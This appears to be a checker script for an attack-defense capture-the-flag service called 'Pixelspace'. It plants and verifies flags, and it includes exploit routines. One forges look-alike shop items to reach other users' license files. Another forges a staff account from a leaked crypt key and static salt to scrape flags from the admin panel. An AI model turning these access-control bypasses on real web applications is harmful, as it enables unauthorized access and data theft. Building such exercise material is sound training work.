from calendar import c
import secrets
from typing import Optional
from urllib.request import CacheFTPHandler
from xmlrpc.client import ResponseError
from httpx import AsyncClient
from util import *
from essential_generators import DocumentGenerator
from logger import CustomFormatter
import logging


from enochecker3 import(
    ChainDB,
    Enochecker,

    MumbleException,
    InternalErrorException,

    #FLAG-Message-Tasks
    GetflagCheckerTaskMessage,
    PutflagCheckerTaskMessage,

    #NOISE-Message-Tasks
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,

    #HAVOC-Message-Tasks
    HavocCheckerTaskMessage,

    #EXPLOIT-Message-Tasks
    ExploitCheckerTaskMessage,
)

from enochecker3.utils import FlagSearcher, assert_equals, assert_in

logging.basicConfig(filename="/var/log/checker.log")
logger = logging.getLogger("My_app")
logger.setLevel(logging.DEBUG)

# create console handler with a higher log level
ch = logging.StreamHandler()
ch.setLevel(logging.DEBUG)

ch.setFormatter(CustomFormatter())

logger.addHandler(ch)





gen = DocumentGenerator()

checker = Enochecker("Pixelspace",8010)
def app(): return checker.app
####################### GETFLAG AND PUTFLAG #########################
@checker.putflag(0)
async def putflag_license(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:   
    item_name = exploitable_item_name(min_length=5).upper()
    user = await register_user(client=client,logger=logger,db=db,chain_id=task.task_chain_id)
    shop_item_kwargs =  {
        'data_path': '/frog.png',
        'item_name': item_name,
        'logged_in': True,
        'flag_str': task.flag,
    }
    
    await create_ShopItem(client=client,logger=logger,db=db,kwargs=shop_item_kwargs)
    shop_listing_kwargs = {
        'item_name': item_name,
        'item_price': 2147483646,
        'description': gen.sentence(),
    }
    await create_ShopListing(client=client,logger=logger,db=db,kwargs=shop_listing_kwargs)
    await logout_user(client=client,logger=logger,db=db,kwargs={'logged_in':True})
    await db.set(task.task_chain_id + "_flag", task.flag)
    await db.set(task.task_chain_id + "_item", item_name)
    await db.set(task.task_chain_id + "_user", {'user':user['username'],'password':user['password1']})


@checker.getflag(0)
async def getflag_license(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    item_id = -1
    try: 
        user = await db.get(task.task_chain_id+"_user")
    except KeyError:
        raise MumbleException("Could not retrieve USER from ChainDB!")

    try:
        flag = await db.get(task.task_chain_id+"_flag")
    except KeyError:
        raise MumbleException("Could not retrieve FLAG from ChainDB!")
    if flag != task.flag:
        raise MumbleException(f"Flags with task_chain_id={task.task_chain_id} are different (DB and task)!")

    try:
        item_name = await db.get(task.task_chain_id+"_item")
    except KeyError:
        raise MumbleException("Could not retrieve ITEM_NAME from ChainDB!")    

    login_kwargs={
        'username': user['user'],
        'password': user['password'],
    }
    await login(client=client,logger=logger,db=db,kwargs=login_kwargs)
    try:
        response = await client.get('user_items/',follow_redirects=True)
    except RequestError:
        raise MumbleException("Error while retrieving user items!")
    
    regex_item = f'<a id="self-view-'+item_name+'" href="(.+?)">View Item</a>'
    item_id = re.findall(regex_item,response.text)[0]
    if item_id == -1:
        raise MumbleException("Errow while searching for FLAG_ITEM (license)!")


    try:
        response = await client.get(f"user_items/license/{item_id}",follow_redirects=True)
    except RequestError:
        raise MumbleException(f"Error while viewing LICENSE from ITEM_ID: {item_id}")
        
    assert_in(task.flag,response.text,"ERROR - getflag_license: License Flag NOT in response!")
    

@checker.putflag(1)
async def putflag_notes(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:    
    user = await register_user(client=client,logger=logger,db=db,chain_id=task.task_chain_id)
    note_kwargs = {
        'note':task.flag,
        'logged_in': True,
    }
    await create_note(client=client,logger=logger,db=db,kwargs=note_kwargs)
    await db.set(task.task_chain_id + "_flag", task.flag)
    await db.set(task.task_chain_id + "_user", {'user':user['username'],'password':user['password1']})
    


@checker.getflag(1)
async def getflag_notes(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    regex_notes = '<input type="text" name="notes" value="(.+?)" maxlength="50000" required id="id_notes">'
    try: 
        user = await db.get(task.task_chain_id+"_user")
        flag = await db.get(task.task_chain_id+"_flag")
    except KeyError:
        raise MumbleException("Could not retrieve data from ChainDB!")
    if flag != task.flag:
        raise MumbleException(f"Flags with task_chain_id={task.task_chain_id} are different (DB and task)!")

    login_kwargs={
        'username': user['user'],
        'password': user['password'],
    }
    await login(client=client,logger=logger,db=db,kwargs=login_kwargs)
    try:
        response = await client.get('notes/',follow_redirects=True)
    except RequestError:
        raise MumbleException("Error while retrieving user items!")

    match = re.findall(regex_notes,response.text)[0]
    assert_in(task.flag,match, 'ERROR - getflag_notes - FLAG NOT FOUND')

####################### GETNOISE AND PUTNOISE #########################

@checker.putnoise(0)
async def put_noise_base_functions(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    user = await register_user(client=client,logger=logger,db=db,chain_id=None)
    item_name = ''.join(secrets.choice(string.ascii_letters) for i in range(random.randint(5,15)))
    shop_item_kwargs =  {
        'data_path': '/frog.png',
        'item_name': item_name,
        'logged_in': True,
        'flag_str': ''.join(secrets.choice(string.ascii_letters) for i in range(random.randint(5,15))),
    }
    
    await create_ShopItem(client=client,logger=logger,db=db,kwargs=shop_item_kwargs)
    shop_listing_kwargs = {
        'item_name': item_name,
        'item_price': random.randint(1,1000),
        'description': ''.join(secrets.choice(string.ascii_letters) for i in range(random.randint(5,25))),
    }
    await create_ShopListing(client=client,logger=logger,db=db,kwargs=shop_listing_kwargs)
    await logout_user(client=client,logger=logger,db=db,kwargs={'logged_in':True})
    await db.set(task.task_chain_id + "_item_name", item_name)
    await db.set(task.task_chain_id + "_user", {'user':user['username'],'password':user['password1']})

@checker.getnoise(0)
async def get_noise_base_functions(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    try: 
        user = await db.get(task.task_chain_id+"_user")
        item = await db.get(task.task_chain_id+"_item_name")
    except KeyError:
        raise MumbleException("Could not retrieve data from ChainDB!")
    
    login_kwargs={
        'username': user['user'],
        'password': user['password'],
    }

    await login(client=client,logger=logger,db=db,kwargs=login_kwargs)

    try:
        response = await client.get('shop',follow_redirects=True)
    except ResponseError:
        raise MumbleException("GET_NOISE_BASE_FUNCTIONS - Error while requesting endpoint shop!")
    if not item in response.text:
        raise MumbleException("GET_NOISE_BASE_FUNCTIONS - Error while searching for previously enlisted item!")

@checker.putnoise(1)
async def put_noise_notes(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    user = await register_user(client=client,logger=logger,db=db,chain_id=None)
    note = gen.sentence()
    note_kwargs = {
        'note': note,
        'logged_in': True,
    }
    await create_note(client=client,logger=logger,db=db,kwargs=note_kwargs)
    await logout_user(client=client,logger=logger,db=db,kwargs={'logged_in':True})
    await db.set(task.task_chain_id + "_noise", note)
    await db.set(task.task_chain_id + "_user", {'user':user['username'],'password':user['password1']})

@checker.getnoise(1)
async def get_noise_notes(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    regex_notes = '<input type="text" name="notes" value="(.+?)" maxlength="50000" required id="id_notes">'
    try: 
        user = await db.get(task.task_chain_id+"_user")
        note = await db.get(task.task_chain_id+"_noise")
    except KeyError:
        raise MumbleException("Could not retrieve data from ChainDB!")

    login_kwargs={
        'username': user['user'],
        'password': user['password'],
    }
    await login(client=client,logger=logger,db=db,kwargs=login_kwargs)
    try:
        response = await client.get('notes/',follow_redirects=True)
    except RequestError:
        raise MumbleException("Error while retrieving user items!")

    print(response.text)
    match = re.findall(regex_notes,response.text)[0]
    assert_in(note,match, f"ERROR - get_noise_notes: {note} not in response")
############################## EXPLOITS ################################


async def exploit_license(searcher: FlagSearcher, client: AsyncClient, db: ChainDB) -> None:
    item_cost = 100000000000.0
    regex_license = '<a href="/(.+?)">View License</a>' 
    regex_item_name = re.compile(f"<td><h4>(.*)</h4>(?:.*)\n(?:.*)\n<td>{item_cost}</td>",re.MULTILINE)
    user = await register_user(client=client,logger=logger,db=db,chain_id=None)

    try:
        response = await client.get('shop/',follow_redirects=True)
    except ResponseError:
        raise MumbleException("EXPLOIT_LICENSE - Error while requesting endpoint shop!")
    
    orig_name = re.findall(regex_item_name,response.text)
    fake_names = []
    for o in orig_name:
        item_name = await make_item_name_exploitable(item_name=o )
        fake_names.append(item_name)
        shop_item_kwargs =  {
            'data_path': '/frog.png',
            'item_name': item_name,
            'logged_in': True,
            'flag_str': 'This is just an exploit',
        }
        
        await create_ShopItem(client=client,logger=logger,db=db,kwargs=shop_item_kwargs)
        shop_listing_kwargs = {
            'item_name': item_name,
            'item_price': 0.01,
            'description': 'This is exploitable',
        }
        await create_ShopListing(client=client,logger=logger,db=db,kwargs=shop_listing_kwargs)
    await logout_user(client=client,logger=logger,db=db,kwargs={'logged_in':True})
    user = await register_user(client=client,logger=logger,db=db,chain_id=None)
    for f in fake_names:
        try:
            response = await client.get('shop/',follow_redirects=True)
        except ResponseError:
            raise MumbleException("EXPLOIT_LICENSE - Error while requesting endpoint shop!")

        item_id=((response.text.split(f)[1]).split('<a href="')[1]).split('"')[0]

        try:
            response = await client.get(f'shop/purchase/{item_id}',follow_redirects=True)
        except ResponseError:
            raise MumbleException(f"EXPLOIT_LICENSE - Error while purchasing item with id {item_id}")

    for o in orig_name:
        try:
            response = await client.get(f'user_items/',follow_redirects=True)
        except ResponseError:
            raise MumbleException(f"EXPLOIT_LICENSE - Error while requesting user items!") 

        item_id=((response.text.split(o)[1]).split('<a href="')[1]).split('"')[0]
        
        
        try:
            response = await client.get(f'user_items/{item_id}',follow_redirects=True)
        except ResponseError:
            raise MumbleException(f"EXPLOIT_LICENSE - Error while viewing item with id {item_id}") 

        license_url = re.findall(regex_license,response.text)[0]
        try:
            response = await client.get(f"{license_url}",follow_redirects=True)
        except RequestError:
            raise MumbleException(f"Error while viewing license of user item with id: {item_id}")
        match = re.findall(searcher._flag_re.pattern.decode('utf-8'),response.text)
        flag = searcher.search_flag(response.text)
        try:
            
            if flag:
                return flag
        except:
            
            if match[0]:
                return match[0]

    raise MumbleException("Could not find flag in license_file")  


async def exploit_staff(searcher: FlagSearcher, client: AsyncClient, db: ChainDB,) -> None:
    key_regex = '<p>Crypt Key: (.+?)</p>'
    """
    try:
        params = await db.get('note_flag')
    except DBSearchError:
        raise MumbleException("Could not retrieve data from ChainDB!")
    """

    user = await register_user(client=client,logger=logger,db=db,chain_id=None)
    
    try:
        response = await client.get(f'user_items/',follow_redirects=True)
    except ResponseError:
        raise MumbleException(f"EXPLOIT_NOTE - Error while requesting users cryptographic key!") 

    
    matches = re.findall(key_regex,response.text)
    staff_kwargs =  {
    'data': user,
    'key': matches[0],
    'salt': 776, #needs to be environmental, static for now
    }

    try:
        response = await client.get(f'logout/',follow_redirects=True)
    except ResponseError:
        raise MumbleException(f"EXPLOIT_NOTE - Error while logging out!")
    
    staff_user = await create_staff_user(client=client,logger=logger,db=db,kwargs=staff_kwargs)

    login_data = {
        'username':staff_user['username'],
        'password':staff_user['password1'],
    }
    await login(client=client,logger=logger,db=db,kwargs=login_data)
    
    try:
        response = await client.get(f'admin/pixels/profile/',follow_redirects=True)
    except ResponseError:
        raise MumbleException(f"EXPLOIT_NOTE - Error while changing to admin panel!")

    profile_regex = '<a href="/admin/pixels/profile/(.+?)/change/'
    
    profiles = re.findall(profile_regex,response.text)
    for prof in profiles:
        try:
            response = await client.get(f'admin/pixels/profile/{int(prof)}/change/',follow_redirects=True)
        except ResponseError:
            raise MumbleException(f"EXPLOIT_NOTE - Error while requesting profile with num{int(prof)}!")

        
        match = re.findall(searcher._flag_re.pattern.decode('utf-8'),response.text)
        flag = searcher.search_flag(response.text)
        try:
            if flag:
                return flag
        except:
            pass
        try:
            if match[0]:
                return match[0]
        except:
            pass

    raise MumbleException("EXPLOIT_NOTE - Failed! No Flag Found!")
############################### HAVOCS #################################

@checker.havoc(0)
async def havoc_endpoints(task: HavocCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    endpoints = [
        '',
        'signup/',
        'login/',
        'shop/',
        #'user_items/',
        'new_item/',
        #'notes/',
        #'giftcode/',
    ]
    for e in endpoints:
        try:
            response = await client.get(e,follow_redirects=True)
        except ResponseError:
            raise MumbleException(f"HAVOC - Cannot reach endpoint <{e}> !")

    
if __name__ == "__main__":
    checker.run()
